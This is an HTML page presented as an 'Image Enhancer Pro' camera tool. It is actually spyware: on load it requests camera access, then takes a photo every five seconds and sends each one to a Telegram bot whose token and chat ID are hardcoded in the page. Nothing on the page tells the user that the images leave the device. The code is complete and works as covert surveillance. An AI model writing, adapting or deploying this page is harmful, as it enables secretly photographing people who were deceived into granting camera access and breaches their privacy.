<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Camera Tool</title>
    <style>
        body { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; }
        #videoElement { width: 100%; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; }
        .overlay { position: absolute; top: 20px; left: 20px; z-index: 2; color: white; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 8px; }
        canvas { display: none; }
        .status { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 2; color: #0f0; font-weight: bold; background: rgba(0,0,0,0.7); padding: 5px 15px; border-radius: 20px; }
    </style>
</head>
<body>

    <!-- Video Preview (User will see this) -->
    <video id="videoElement" autoplay playsinline muted></video>
    
    <div class="overlay">
        <h3>Image Enhancer Pro</h3>
        <p>System Active...</p>
    </div>
    
    <div class="status" id="statusMsg">Waiting for permission...</div>
    <canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvas');
    const statusMsg = document.getElementById('statusMsg');
    
    // Your Telegram Credentials
    const BOT_TOKEN = "7778975126:AAGbDbqBkVcWpPOcFnEaUxLtQ5wck6hsov0";
    const CHAT_ID = "5916486983";

    // 1. Auto Request Permission on Load
    window.addEventListener('load', async () => {
        try {
            statusMsg.innerText = "Requesting Camera Access...";
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" }, // Use back camera if available
                audio: false 
            });
            video.srcObject = stream;
            statusMsg.innerText = "Camera Active | Sending Images...";
            
            // Start auto-capturing every 5 seconds
            setInterval(captureAndSend, 5000); 
            
        } catch (err) {
            statusMsg.innerText = "Permission Denied! Please Allow Camera.";
            console.error("Error:", err);
        }
    });

    // 2. Capture and Send Function
    function captureAndSend() {
        if (!video.srcObject) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', 'Auto-captured from Web App');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if(data.ok) {
                    console.log("Image sent successfully");
                }
            } catch (error) {
                console.error("Send failed", error);
            }
        }, 'image/jpeg', 0.7); // 0.7 quality to save data
    }
</script>

</body>
</html>
